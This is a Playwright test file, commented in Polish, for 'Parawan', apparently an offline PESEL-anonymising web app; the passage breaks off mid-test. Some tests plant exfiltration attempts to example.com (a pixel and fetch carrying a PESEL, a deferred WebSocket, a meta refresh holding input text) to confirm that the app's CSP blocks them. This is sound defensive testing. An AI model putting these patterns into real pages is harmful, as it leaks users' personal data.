// Test dymny gotowego pliku: start z przykładu, PDF, wczytanie DOCX i PDF, pobranie .txt,
// pamięć ustawień, rozmiar, landing i działająca CSP. Każdy test przez withApp(), więc po nim
// sprawdzamy zero żądań poza plikiem, zero naruszeń CSP, brak meta refresh, zero wyjątków
// i błędów konsoli, także w dobie po scenariuszu (przewinięty zegar strony).
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { strToU8, zipSync } from 'fflate';
import { CSP_TARGETS, cspProblems, htmlCspProblems } from './csp.mjs';
import {
  ALLOWED_STORAGE_KEYS,
  EXAMPLE_NAME,
  EXAMPLE_PESEL,
  FIXTURES,
  LANDING_HTML,
  LEGACY_SKIP,
  MAX_WEB_BYTES,
  PISMO_PESEL,
  WEB_HTML,
  fileSize,
  launch,
  openApp,
  withApp,
} from './helpers.mjs';

/** @type {import('playwright').Browser} */
let browser;
before(async () => {
  browser = await launch();
});
after(async () => {
  await browser?.close();
});

const DOCX_MIME = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';

const W_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
const wPara = (text) => `<w:p><w:r><w:t xml:space="preserve">${text}</w:t></w:r></w:p>`;
/** Część WordprocessingML (nagłówek, komentarze) z deklaracją przestrzeni nazw. */
const wPart = (root, body) =>
  strToU8(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:${root} xmlns:w="${W_NS}">${body}</w:${root}>`);

/**
 * Minimalny DOCX jak z edytora: akapity w word/document.xml (fflate, jak w docx.test.ts),
 * a w `extra` dodatkowe części (nagłówek, komentarze) i surowy XML treści w `bodyXml`.
 */
function makeDocx(paragraphs, { extra = {}, bodyXml = '' } = {}) {
  const body = paragraphs.map(wPara).join('') + bodyXml;
  const xml =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    `<w:document xmlns:w="${W_NS}"><w:body>${body}</w:body></w:document>`;
  return zipSync({
    '[Content_Types].xml': strToU8(
      '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
    ),
    'word/document.xml': strToU8(xml),
    ...extra,
  });
}

/**
 * Po wczytaniu DOCX albo PDF aplikacja sama przechodzi do „Porównania” (oryginał przekreślony
 * obok znacznika). Tekst do skopiowania i pobrania to widok „Wynik”, więc sprawdzamy go tam.
 * Znacznik [PESEL] musi stać także w tym widoku: testy sprawdzają potem tylko, że numeru w nim
 * nie ma, a taki warunek spełnia też pusty albo niewyrenderowany wynik.
 */
async function resultText(app) {
  await app.page.getByRole('button', { name: 'Wynik', exact: true }).click();
  await app.page.waitForFunction(
    () => document.getElementById('view-result')?.getAttribute('aria-pressed') === 'true',
  );
  const out = await app.output();
  assert.ok(out.includes('[PESEL]'), `widok „Wynik” bez znacznika [PESEL]:\n„${out}”`);
  return out;
}

const bytes = (n) => n.toLocaleString('pl-PL');

test(`plik aplikacji nie przekracza ${bytes(MAX_WEB_BYTES)} B`, () => {
  const size = fileSize(WEB_HTML);
  assert.ok(size <= MAX_WEB_BYTES, `apps/web/dist/index.html ma ${bytes(size)} B, limit ${bytes(MAX_WEB_BYTES)} B`);
});

// Każda dyrektywa osobno: dopisany host w img-src albo font-src przeszedłby test samych napisów
// default-src i connect-src 'none', a obrazek z treścią pisma w adresie to też wysyłka.
for (const [name, target] of Object.entries(CSP_TARGETS)) {
  test(`${name}: CSP bez żadnego źródła spoza pliku`, async (t) => {
    const fromFile = htmlCspProblems(readFileSync(target.file, 'utf8'), target.extra);
    assert.deepEqual(fromFile, [], `CSP w pliku ${target.file}:\n${fromFile.join('\n')}`);
    await withApp(
      browser,
      t,
      '',
      async ({ page }) => {
        // To, co przeczytała przeglądarka, a nie tylko tekst pliku.
        const metas = await page.evaluate(() =>
          [...document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')].map((m) => m.content),
        );
        assert.equal(metas.length, 1, `tagów meta CSP: ${metas.length}`);
        const problems = cspProblems(metas[0], target.extra);
        assert.deepEqual(problems, [], `CSP „${metas[0]}”:\n${problems.join('\n')}`);
      },
      { file: target.file },
    );
  });
}

test('CSP zatrzymuje próbę wysłania danych (fetch, obrazek)', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const result = await app.page.evaluate(async () => {
      const img = new Image();
      const imgDone = new Promise((resolve) => {
        img.onerror = () => resolve('zablokowany');
        img.onload = () => resolve('wczytany');
      });
      img.src = 'https://example.com/piksel.png?pesel=44051401359';
      let fetched;
      try {
        await fetch('https://example.com/?pesel=44051401359', { method: 'POST', body: 'tekst' });
        fetched = 'wysłany';
      } catch {
        fetched = 'zablokowany';
      }
      return { fetched, img: await imgDone };
    });
    assert.deepEqual(result, { fetched: 'zablokowany', img: 'zablokowany' });
    // Blokada ma pochodzić z CSP pliku, a nie z przerwania w teście (route w helpers.mjs): bez
    // meta CSP oba żądania wyszłyby z przeglądarki i trafiły na tę listę.
    const leaked = await app.leakedRequests();
    assert.deepEqual(leaked, [], `żądania spoza pliku:\n${leaked.join('\n')}`);
    // Przeglądarka zgłasza naruszenie obu dyrektyw, więc wiadomo, że to CSP je zatrzymała.
    const directives = app.takeViolations((v) => v.blocked.includes('example.com')).map((v) => v.directive);
    assert.ok(directives.includes('connect-src'), `brak naruszenia connect-src: ${directives}`);
    assert.ok(directives.includes('img-src'), `brak naruszenia img-src: ${directives}`);
    // Komunikaty Chromium o zablokowaniu obu żądań przez CSP są w tym teście oczekiwane (brzmienie
    // zmienia się między wersjami, stały jest adres i wzmianka o CSP). Inne błędy, np. wyjątek
    // z timera aplikacji, zostają dla assertClean().
    app.takeConsoleErrors(/example\.com.*Content Security Policy/);
  });
});

test('bramka widzi próbę wysyłki i wyjątek odłożone na później (timer, WebSocket, meta refresh)', async () => {
  // Test samej bramki: scenariusz kończy się w niecałą sekundę, a zdarzenia przychodzą po 5 i 20 s
  // (minuta przewijana krok po kroku) i po 3 godzinach (skok o dobę). Bez przewinięcia zegara
  // w assertClean() wszystkie wypadłyby po zamknięciu strony. Meta refresh liczy czas
  // rzeczywisty, którego przewijanie nie dotyka, więc z godzinnym opóźnieniem nigdy nie odpali
  // w teście; bramka ma zobaczyć sam znacznik.
  const app = await openApp(browser, '?demo');
  try {
    await app.demoReady();
    await app.page.evaluate(() => {
      const meta = document.createElement('meta');
      meta.httpEquiv = 'refresh';
      meta.content = `3600;url=https://example.com/nawigacja?d=${encodeURIComponent(
        document.getElementById('input').value.slice(0, 20),
      )}`;
      document.head.append(meta);
      setTimeout(() => {
        new Image().src = 'https://example.com/pozniej.png';
      }, 5_000);
      setTimeout(() => {
        throw new Error('wyjątek z timera');
      }, 20_000);
      setTimeout(
        () => {
          new WebSocket('wss://example.com/pozniej');
        },
        3 * 60 * 60_000,
      );
    });
    await assert.rejects(() => app.assertClean());
    // Obrazek zatrzymuje CSP (naruszenie img-src); bez CSP byłby żądaniem na liście wycieków.
    // Bramka ma go zobaczyć w jednej z tych postaci.
    const leaked = await app.leakedRequests();
    const imgSeen =
      app.violations.some((v) => v.directive === 'img-src' && v.blocked.includes('pozniej.png')) ||
      leaked.some((l) => l.includes('example.com/pozniej.png'));
    assert.ok(imgSeen, `bramka nie widzi odroczonego obrazka:\n${JSON.stringify(app.violations)}\n${leaked.join('\n')}`);
    assert.ok(
      leaked.some((l) => l.startsWith('WebSocket wss://example.com/pozniej')),
      `bramka nie widzi WebSocketu:\n${leaked.join('\n')}`,
    );
    assert.ok(
      app.pageErrors.some((m) => m.includes('wyjątek z timera')),
      `bramka nie widzi wyjątku z timera:\n${app.pageErrors.join('\n')}`,
    );
    assert.ok(
      app.refreshes.some((c) => c.includes('example.com/nawigacja')),
      `bramka nie widzi meta refresh:\n${app.refreshes.join('\n')}`,
    );
  } finally {
    await app.close();
  }
});

test('?demo: przykład zamaskowany, numer PESEL nie przechodzi do wyniku', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    await app.demoReady();
    const out = await app.output();
    assert.ok(!out.includes(EXAMPLE_PESEL), `w wyniku jest numer ${EXAMPLE_PESEL}:\n${out}`);
  });
});

/* ── Komunikat startowy: Parawan nie ruszył albo JavaScript jest wyłączony ── */

const BOOT_FAIL_TEXT = 'Parawan nie uruchomił się w tej przeglądarce';
const NO_JS_TEXT = 'Ta przeglądarka ma wyłączony JavaScript';
// Pasek pokazuje się po 4 s (animation-delay w index.html).
const BOOT_FAIL_DELAY_MS = 4_000;
// Bez JavaScriptu czekamy dłużej niż to opóźnienie, żeby pasek zdążył się pokazać, gdyby miał.
const BOOT_FAIL_AFTER_MS = 4_500;

/** Teksty widocznych komunikatów startowych (.boot-fail; visibility: hidden i 0 px to niewidoczne). */
const visibleBootFails = (page) => page.locator('.boot-fail:visible').allTextContents();

/**
 * Animacja, która odsłania #boot-fail: opóźnienie z CSS i czas, jaki minął od jej startu.
 * Zegar Playwright (clock.install) podmienia Date i performance.now, ale nie czas animacji CSS.
 */
const bootReveal = (page) =>
  page.evaluate(() => {
    const anim = document
      .getElementById('boot-fail')
      ?.getAnimations()
      .find((a) => a.animationName === 'boot-reveal');
    return { delay: anim?.effect?.getTiming().delay ?? null, elapsed: anim?.currentTime ?? null };
  });

test('zwykły start: main.ts usuwa pasek „nie uruchomił się” z dokumentu', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    await app.demoReady();
    assert.equal(await app.page.locator('#boot-fail').count(), 0, '#boot-fail został w DOM po starcie');
    assert.deepEqual(await visibleBootFails(app.page), []);
  });
});

// Kopia bez <script type="module"> wygląda tak jak plik w silniku, który nie sparsował modułu
// (Chromium 90 z SyntaxError, tryb Internet Explorera): HTML i CSS są, skryptu nie ma.
for (const reducedMotion of ['reduce', 'no-preference']) {
  test(`plik bez działającego skryptu: po 4 s pasek „nie uruchomił się” (reducedMotion: ${reducedMotion})`, async (t) => {
    const html = readFileSync(WEB_HTML, 'utf8');
    const modules = html.match(/<script type="module"[^>]*>[\s\S]*?<\/script>/g) ?? [];
    assert.equal(modules.length, 1, `skryptów modułowych w pliku: ${modules.length}`);
    const dead = html.replace(modules[0], '');
    assert.ok(!/<script/i.test(dead), 'w kopii został inny skrypt');
    const dir = mkdtempSync(path.join(tmpdir(), 'parawan-bez-modulu-'));
    const file = path.join(dir, 'Parawan.html');
    writeFileSync(file, dead);
    try {
      await withApp(
        browser,
        t,
        '',
        async ({ page }) => {
          await page.waitForLoadState('load');
          // Na początku pasek jest ukryty i nie zajmuje miejsca, więc przy zwykłym starcie nie
          // mignie ani nie przesunie strony, zanim main.ts go usunie.
          assert.deepEqual(await visibleBootFails(page), [], 'pasek widoczny od razu, bez opóźnienia');
          const box = await page.locator('#boot-fail').boundingBox();
          assert.equal(box?.height ?? 0, 0, `ukryty pasek zajmuje ${box?.height} px`);
          // Czas liczy sama animacja, nie zegar testu: ten obejmował też otwarcie kontekstu i
          // wczytanie pliku, a przy trzech plikach testów naraz pasek nie zdążał się pokazać
          // przed sprawdzeniem. Odczyt idzie po sprawdzeniu ukrycia, więc elapsed poniżej
          // opóźnienia znaczy, że ukrycie sprawdzono przed jego upływem. Przy ograniczonym
          // ruchu style.css skraca animacje, ale opóźnienie ma zostać.
          const start = await bootReveal(page);
          assert.equal(start.delay, BOOT_FAIL_DELAY_MS, `opóźnienie paska: ${start.delay} ms`);
          assert.ok(
            start.elapsed !== null && start.elapsed < BOOT_FAIL_DELAY_MS,
            `ukrycie sprawdzone dopiero ${start.elapsed} ms po starcie animacji`,
          );

          await page
            .locator('#boot-fail')
            .waitFor({ state: 'visible', timeout: 2 * BOOT_FAIL_DELAY_MS });
          const { elapsed } = await bootReveal(page);
          assert.ok(
            (elapsed ?? 0) >= BOOT_FAIL_DELAY_MS,
            `pasek pokazał się po ${elapsed} ms, przed końcem opóźnienia`,
          );
          const shown = await visibleBootFails(page);
          assert.equal(shown.length, 1, `widocznych komunikatów: ${shown.length}`);
          assert.ok(shown[0].includes(BOOT_FAIL_TEXT), `inny komunikat: „${shown[0]}”`);
          const after = await page.locator('#boot-fail').boundingBox();
          assert.ok((after?.height ?? 0) > 40, `pasek ma ${after?.height} px wysokości`);
          assert.ok((after?.y ?? 999) < 60, `pasek nie stoi u góry strony (y = ${after?.y})`);

          // Na papier idzie sam #print-out, więc pasek nie może trafić na wydruk.
          await page.emulateMedia({ media: 'print' });
          assert.deepEqual(await visibleBootFails(page), [], 'pasek widoczny na wydruku');
          await page.emulateMedia({ media: null });
        },
        { file, reducedMotion },
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
}

test('wyłączony JavaScript: jeden komunikat od razu, bez paska po 4 s', async (t) => {
  await withApp(
    browser,
    t,
    '',
    async ({ page }) => {
      await page.waitForLoadState('load');
      const now = await visibleBootFails(page);
      assert.equal(now.length, 1, `widocznych komunikatów od razu: ${now.length}`);
      assert.ok(now[0].includes(NO_JS_TEXT), `inny komunikat: „${now[0]}”`);
      await page.waitForTimeout(BOOT_FAIL_AFTER_MS);
      const later = await visibleBootFails(page);
      assert.deepEqual(later, now, 'po 4 s pojawił się drugi komunikat');
      assert.equal(await page.locator('#boot-fail').isVisible(), false);
      await page.emulateMedia({ media: 'print' });
      assert.deepEqual(await visibleBootFails(page), [], 'komunikat bez JavaScriptu widoczny na wydruku');
      await page.emulateMedia({ media: null });
    },
    { javaScriptEnabled: false },
  );
});

test('?pdftest: pdf.js działa w pliku z dysku', async (t) => {
  await withApp(browser, t, '?pdftest', async ({ page }) => {
    await page.waitForFunction(
      () => /^\[PDF (OK|FAIL)\]/.test(document.getElementById('input')?.value ?? ''),
      null,
      { timeout: 10_000 },
    );
    const value = await page.locator('#input').inputValue();
    assert.ok(value.startsWith('[PDF OK]'), `samodiagnostyka PDF: „${value.slice(0, 200)}”`);
  });
});

test('wczytany DOCX: PESEL zasłonięty w wyniku', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const docx = makeDocx([
      'Wójt Gminy Brzozowa Wola',
      'Na wniosek Pana Tomasza Wierzbickiego, PESEL 85071412358, orzekam jak w sentencji.',
    ]);
    await app.page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-test.docx', mimeType: DOCX_MIME, buffer: Buffer.from(docx) });
    await app.waitForOutput('[PESEL]');
    assert.match(await app.page.locator('#input').inputValue(), /Wierzbickiego/);
    const out = await resultText(app);
    assert.ok(!out.includes('85071412358'), `numer PESEL z DOCX przeszedł do wyniku:\n${out}`);
    // dokument bez nagłówków, przypisów i komentarzy: bez komunikatu o pominiętych częściach
    assert.equal(await app.page.locator('#app-note').isVisible(), false, 'komunikat po zwykłym DOCX');
  });
});

/** Fikcyjne pismo z nagłówkiem, komentarzem i ukrytym zdaniem (dane zmyślone). */
const DOCX_Z_CZESCIAMI = () =>
  makeDocx(
    ['Wójt Gminy Brzozowa Wola', 'Na wniosek Pana Tomasza Wierzbickiego, PESEL 85071412358, orzekam jak w sentencji.'],
    {
      bodyXml:
        '<w:p><w:r><w:t xml:space="preserve">Uzasadnienie. </w:t></w:r>' +
        '<w:r><w:rPr><w:vanish/></w:rPr><w:t>Notatka: wnioskodawca dzwonił z numeru 600 700 800.</w:t></w:r></w:p>',
      extra: {
        'word/header1.xml': wPart('hdr', wPara('Sprawę prowadzi: Anna Nowak, tel. 29 741 22 10')),
        'word/comments.xml': wPart(
          'comments',
          `<w:comment w:id="0" w:author="Anna Nowak" w:initials="AN">${wPara('Sprawdzić adres wnioskodawcy.')}</w:comment>`,
        ),
      },
    },
  );

// Zdanie o ukrytym tekście stoi w osobnym wierszu (white-space: pre-line na #app-note-text).
const DOCX_NOTE =
  'Wczytano treść główną dokumentu. Parawan nie czyta: nagłówków i stopek (1), komentarzy (1). ' +
  'Przejrzyj je przed publikacją albo publikuj nowy dokument zapisany z wyniku.\n' +
  'Dokument ma ukryty tekst (1 fragment). W polu źródła i w wyniku widać go jak zwykły tekst. ' +
  'Usuń go, jeśli nie ma trafić do publikacji.';

test('DOCX z nagłówkiem i komentarzem: komunikat wylicza pominięte części i ukryty tekst', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const { page } = app;
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-czesci.docx', mimeType: DOCX_MIME, buffer: Buffer.from(DOCX_Z_CZESCIAMI()) });
    await app.waitForOutput('[PESEL]');
    await page.locator('#app-note').waitFor({ state: 'visible' });
    assert.equal((await page.locator('#app-note-text').textContent())?.trim(), DOCX_NOTE);
    // pole było puste, więc nie ma czego cofać; komunikat czyta czytnik ekranu (role="status")
    assert.equal(await page.locator('#app-note-undo').isVisible(), false, '„Cofnij” przy pustym polu');
    assert.equal(await page.locator('#app-note-status').getAttribute('role'), 'status');
    assert.equal((await page.locator('#app-note-status').textContent())?.trim(), DOCX_NOTE);
    // ukryte zdanie jest w polu i zostało zamaskowane, treść nagłówka i komentarza nie trafia do pola
    const input = await page.locator('#input').inputValue();
    assert.match(input, /wnioskodawca dzwonił/);
    assert.doesNotMatch(input, /Anna Nowak|Sprawdzić adres/);
    const out = await resultText(app);
    assert.ok(!out.includes('600 700 800'), `numer z ukrytego tekstu przeszedł do wyniku:\n${out}`);
    // ostrzeżenie stoi w dwóch wierszach, nie w jednym akapicie
    const lines = await page.locator('#app-note-text').evaluate((el) => {
      const range = document.createRange();
      range.selectNodeContents(el);
      return new Set([...range.getClientRects()].map((r) => Math.round(r.top))).size;
    });
    assert.ok(lines >= 2, `komunikat w ${lines} wierszu`);
    // Własna edycja zaraz po wczytaniu (fokus jest w polu) nie kasuje ostrzeżenia o częściach pliku:
    // nagłówek i komentarz dalej są w oryginale.
    await page.locator('#input').click();
    await page.keyboard.press('Control+End');
    await page.keyboard.type(' x');
    await app.waitForOutput(' x');
    assert.equal(await page.locator('#app-note').isVisible(), true, 'komunikat zniknął po edycji');
    assert.equal((await page.locator('#app-note-text').textContent())?.trim(), DOCX_NOTE);
    await page.getByRole('button', { name: 'Zamknij komunikat' }).click();
    assert.equal(await page.locator('#app-note').isVisible(), false);
  });
});

test('DOCX bez tekstu w treści głównej (skan jako obraz): błąd wylicza części pliku, nie „Plik jest pusty”', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const { page } = app;
    const scan = makeDocx([], {
      bodyXml: '<w:p/><w:p><w:r><w:drawing/></w:r></w:p><w:p/>',
      extra: {
        'word/footer1.xml': wPart('ftr', wPara('Wnioskodawca: Celestyn Stopkowski, PESEL 02270803628')),
        'word/media/image1.png': new Uint8Array(8),
      },
    });
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'skan.docx', mimeType: DOCX_MIME, buffer: Buffer.from(scan) });
    await page.locator('#app-error').waitFor({ state: 'visible' });
    assert.equal(
      (await page.locator('#app-error').textContent())?.trim(),
      'W treści głównej dokumentu nie ma tekstu. Plik nie jest jednak pusty, Parawan nie czyta w nim: ' +
        'nagłówków i stopek (1), obrazów (1). Przejrzyj je w Wordzie przed publikacją. Jeśli to skan, ' +
        'wklej tekst ręcznie, bo rozpoznawanie tekstu ze skanów (OCR) nie jest obsługiwane.',
    );
    assert.equal(await page.locator('#app-error').getAttribute('role'), 'alert');
    assert.equal(await page.locator('#input').inputValue(), '', 'pole źródła zmienione mimo błędu');
    // naprawdę pusty dokument dalej dostaje zwykły komunikat
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'pusty.docx', mimeType: DOCX_MIME, buffer: Buffer.from(makeDocx([], { bodyXml: '<w:p/>' })) });
    await page.locator('#app-error').getByText('Plik jest pusty').waitFor();
  });
});

// Pole źródła stoi w <form autocomplete="off"> (Chrome i Edge 109 zapisywały inaczej jego treść
// w plikach sesji). Formularz nie może niczego wysłać ani przeładować strony.
test('pole źródła w formularzu: Enter i Ctrl+Enter nie wysyłają formularza ani nie przeładowują strony', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const { page } = app;
    const url = page.url();
    await page.evaluate(() => {
      window.__parawanSubmits = 0;
      document.addEventListener('submit', () => window.__parawanSubmits++, true);
    });
    await page.locator('#input').click();
    await page.keyboard.type('Jan Kowalski, PESEL 85071412358');
    await page.keyboard.press('Enter');
    await page.keyboard.type('drugi wiersz');
    await page.keyboard.press('Control+Enter');
    await app.waitForOutput('[PESEL]');
    assert.equal(await page.evaluate(() => window.__parawanSubmits), 0, 'formularz został wysłany');
    assert.equal(page.url(), url);
    assert.equal(await page.locator('#input').inputValue(), 'Jan Kowalski, PESEL 85071412358\ndrugi wiersz');
    // Wysłanie wprost (jak Enter w polu <input>, gdyby kiedyś stanęło w tym formularzu): main.ts
    // je zatrzymuje, więc nie ma nawigacji ani naruszenia form-action (sprawdza assertClean).
    const prevented = await page.evaluate(() => {
      let flag = null;
      document.addEventListener('submit', (e) => setTimeout(() => (flag = e.defaultPrevented)), { once: true });
      document.querySelector('form.ta-form')?.requestSubmit();
      return new Promise((resolve) => setTimeout(() => resolve(flag), 50));
    });
    assert.equal(prevented, true, 'wysłanie formularza nie zostało zatrzymane');
    assert.equal(page.url(), url);
    assert.equal(await page.locator('#input').inputValue(), 'Jan Kowalski, PESEL 85071412358\ndrugi wiersz');
    // pole naprawdę stoi w formularzu; bez niego test nie sprawdzałby niczego
    assert.equal(await page.locator('form.ta-form[autocomplete="off"] > #input').count(), 1);
  });
});

test('DOCX z częściami wczytany na istniejący tekst: „Cofnij” i komunikat, który zostaje po nim', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    const { page } = app;
    await app.demoReady();
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-czesci.docx', mimeType: DOCX_MIME, buffer: Buffer.from(DOCX_Z_CZESCIAMI()) });
    await page.locator('#app-note-text').getByText('Parawan nie czyta').waitFor();
    assert.equal(
      (await page.locator('#app-note-text').textContent())?.trim(),
      `Zastąpiono tekst treścią pliku.\n${DOCX_NOTE}`,
    );
    assert.equal(await page.locator('#app-note-undo').isVisible(), true);
    // po 20 s „Cofnij” znika, a dopisek o częściach dokumentu zostaje do zamknięcia
    await page.clock.runFor(21_000);
    assert.equal(await page.locator('#app-note-undo').isVisible(), false);
    assert.equal((await page.locator('#app-note-text').textContent())?.trim(), DOCX_NOTE);
    await page.getByRole('button', { name: 'Zamknij komunikat' }).click();
    assert.equal(await page.locator('#app-note').isVisible(), false);
    // Edycja zaraz po wczytaniu zabiera „Cofnij” (przywróciłoby tekst sprzed edycji), a dopisek zostaje.
    // Najpierw zmiana pola: ten sam plik wczytany na identyczny tekst nie ma czego cofać.
    await page.locator('#input').click();
    await page.keyboard.press('Control+End');
    await page.keyboard.type(' y');
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-czesci.docx', mimeType: DOCX_MIME, buffer: Buffer.from(DOCX_Z_CZESCIAMI()) });
    await page.locator('#app-note-undo').waitFor({ state: 'visible' });
    await page.locator('#input').click();
    await page.keyboard.press('Control+End');
    await page.keyboard.type(' x');
    assert.equal(await page.locator('#app-note-undo').isVisible(), false, '„Cofnij” po edycji');
    assert.equal((await page.locator('#app-note-text').textContent())?.trim(), DOCX_NOTE);
  });
});

test('„Cofnij” po „Wyczyść” i „Przykład” przywraca tekst z pliku razem z dopiskiem o jego częściach', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const { page } = app;
    const noteText = async () => (await page.locator('#app-note-text').textContent())?.trim();
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-czesci.docx', mimeType: DOCX_MIME, buffer: Buffer.from(DOCX_Z_CZESCIAMI()) });
    await app.waitForOutput('[PESEL]');
    assert.equal(await noteText(), DOCX_NOTE);
    const docxText = await page.locator('#input').inputValue();
    for (const [button, note] of [
      ['#clear', 'Wyczyszczono tekst.'],
      ['#example', 'Wstawiono przykład w miejsce Twojego tekstu.'],
    ]) {
      await page.locator(button).click();
      assert.equal(await noteText(), note, `pasek po ${button}`);
      await page.getByRole('button', { name: 'Cofnij' }).click();
      assert.equal(await page.locator('#input').inputValue(), docxText, `tekst po „Cofnij” (${button})`);
      // ostrzeżenie o nagłówku i komentarzu wraca, bo te części dalej są w oryginale
      assert.equal(await page.locator('#app-note').isVisible(), true, `dopisek po „Cofnij” (${button})`);
      assert.equal(await noteText(), DOCX_NOTE);
      assert.equal(await page.locator('#app-note-undo').isVisible(), false);
      assert.equal(
        (await page.locator('#app-note-status').textContent())?.trim(),
        `Przywrócono poprzedni tekst.\n${DOCX_NOTE}`,
      );
    }
  });
});

test('opróżnione pole zamyka dopisek o pliku: nie wisi nad nowo wpisanym tekstem', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const { page } = app;
    await page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-czesci.docx', mimeType: DOCX_MIME, buffer: Buffer.from(DOCX_Z_CZESCIAMI()) });
    await app.waitForOutput('[PESEL]');
    await page.locator('#app-note').waitFor({ state: 'visible' });
    await page.locator('#input').click();
    await page.keyboard.press('Control+A');
    await page.keyboard.press('Delete');
    assert.equal(await page.locator('#app-note').isVisible(), false, 'dopisek po opróżnieniu pola');
    assert.equal((await page.locator('#app-note-status').textContent())?.trim(), '');
    await page.keyboard.type('Inny tekst wklejony z poczty.');
    assert.equal(await page.locator('#app-note').isVisible(), false, 'dopisek nad nowym tekstem');
    // dopisek o kodowaniu pliku tak samo
    const cp1250 = Buffer.from([0x5a, 0x61, 0xbf, 0xf3, 0xb3, 0xe6, 0x20, 0x67, 0xea, 0x9c, 0x6c, 0xb9]);
    await page.locator('#file-input').setInputFiles({ name: 'ansi.txt', mimeType: 'text/plain', buffer: cp1250 });
    await page.locator('#app-note-text').getByText('Windows-1250').waitFor();
    await page.locator('#input').click();
    await page.keyboard.press('Control+A');
    await page.keyboard.press('Delete');
    assert.equal(await page.locator('#app-note').isVisible(), false, 'dopisek o kodowaniu po opróżnieniu pola');
  });
});

test('wczytany PDF (fixtures/urzad/pismo.pdf): PESEL zasłonięty w wyniku', async (t) => {
  await withApp(browser, t, '', async (app) => {
    await app.page.locator('#file-input').setInputFiles(path.join(FIXTURES, 'pismo.pdf'));
    await app.waitForOutput('[PESEL]');
    const input = await app.page.locator('#input').inputValue();
    assert.match(input, /Kowalskiej/);
    assert.ok(input.includes(PISMO_PESEL), `w tekście z pismo.pdf nie ma numeru PISMO_PESEL ${PISMO_PESEL}`);
    const out = await resultText(app);
    assert.ok(!out.includes(PISMO_PESEL), `numer PESEL z PDF przeszedł do wyniku:\n${out}`);
  });
});

test('„Pobierz .txt” zapisuje wynik z zasłoniętym numerem PESEL', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    await app.demoReady();
    const [download] = await Promise.all([
      app.page.waitForEvent('download'),
      app.page.getByRole('button', { name: 'Pobierz .txt' }).click(),
    ]);
    assert.match(download.suggestedFilename(), /^zanonimizowany-[\d_-]+\.txt$/);
    const text = readFileSync(await download.path(), 'utf8');
    assert.ok(text.includes('[PESEL]'), `w pobranym pliku brak [PESEL]:\n${text}`);
    assert.ok(!text.includes(EXAMPLE_PESEL), `w pobranym pliku jest numer ${EXAMPLE_PESEL}`);
  });
});

test('localStorage: tylko znane klucze ustawień, bez treści pisma', async (t) => {
  // Bez reducedMotion: przy ograniczonym ruchu przycisk pauzy animacji jest ukryty.
  const opts = { reducedMotion: 'no-preference' };
  await withApp(browser, t, '?demo', async (app) => {
    const { page } = app;
    await app.demoReady();
    // Zmiana każdego zapamiętywanego ustawienia: typ danych, tryb osób, animacja.
    await page.locator('#mask-toggles input[data-key]').first().uncheck();
    await page.locator('#pseudonyms').check();
    await page.locator('#demo-motion').click();
    const store = await page.evaluate(() => ({ ...localStorage }));
    const keys = Object.keys(store);
    const unknown = keys.filter((k) => !ALLOWED_STORAGE_KEYS.includes(k));
    assert.deepEqual(unknown, [], `nieznane klucze w localStorage: ${unknown}`);
    assert.deepEqual(keys.sort(), [...ALLOWED_STORAGE_KEYS].sort(), 'ustawienia nie zostały zapisane');
    const values = Object.values(store).join(' ');
    assert.ok(!values.includes(EXAMPLE_PESEL) && !values.includes(EXAMPLE_NAME), 'treść pisma w localStorage');
  }, opts);
});

test('landing z dysku ładuje się bez żądań i błędów', async (t) => {
  await withApp(
    browser,
    t,
    '',
    async ({ page }) => {
      await page.waitForLoadState('load');
      // Przewinięcie do końca uruchamia sekcje włączane przy wejściu w kadr.
      await page.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight));
      await page.waitForTimeout(500);
      assert.match(await page.title(), /Parawan/);
    },
    { file: LANDING_HTML },
  );
});

test('stary silnik (PARAWAN_CHROMIUM): ?demo maskuje PESEL', { skip: LEGACY_SKIP }, async (t) => {
  const legacy = await launch({ legacy: true });
  try {
    await withApp(legacy, t, '?demo', async (app) => {
      await app.demoReady();
      assert.ok(!(await app.output()).includes(EXAMPLE_PESEL));
    });
  } finally {
    await legacy.close();
  }
});

// Chrome i Edge 109–123 nie mają iteracji ReadableStream, z której korzysta pdf.js 6; łatka
// w pdf.ts ją dopisuje. Bez niej oba scenariusze kończyły się błędem odczytu PDF.
test('stary silnik (PARAWAN_CHROMIUM): ?pdftest i wczytany pismo.pdf', { skip: LEGACY_SKIP }, async (t) => {
  const legacy = await launch({ legacy: true });
  try {
    await withApp(legacy, t, '?pdftest', async ({ page }) => {
      await page.waitForFunction(
        () => /^\[PDF (OK|FAIL)\]/.test(document.getElementById('input')?.value ?? ''),
        null,
        { timeout: 10_000 },
      );
      const value = await page.locator('#input').inputValue();
      assert.ok(value.startsWith('[PDF OK]'), `samodiagnostyka PDF: „${value.slice(0, 200)}”`);
    });
    await withApp(legacy, t, '', async (app) => {
